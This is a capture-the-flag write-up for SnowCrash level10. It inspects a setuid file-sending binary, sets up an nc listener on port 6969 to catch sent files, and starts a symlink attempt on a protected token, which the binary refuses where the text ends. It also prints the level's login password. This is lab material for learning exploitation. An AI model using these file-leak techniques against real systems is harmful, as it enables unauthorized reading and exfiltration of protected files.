## level10
```
flag09@SnowCrash:~$ su level10
Password: s5cAJpM8ev6XHw998pRWG728z
level10@SnowCrash:~$
```
```
level10@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
```
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ cat token 
cat: token: Permission denied
```
```
level10@SnowCrash:~$ ./level10 .bashrc 0.0.0.0
Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
```
i use `tmux` for multi windows  
`0.0.0.0:6969` we will be listen this port with  help `nc`
```
nc -l 6969
```
create file for test connection 
```
echo Hello! > /tmp/test
./level10 /tmp/test 0.0.0.0
```
```
level10@SnowCrash:~$ nc -l 6969
.*( )*.
hello!
```
create link for `token`
```
level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
You don't have access to /tmp/link
```
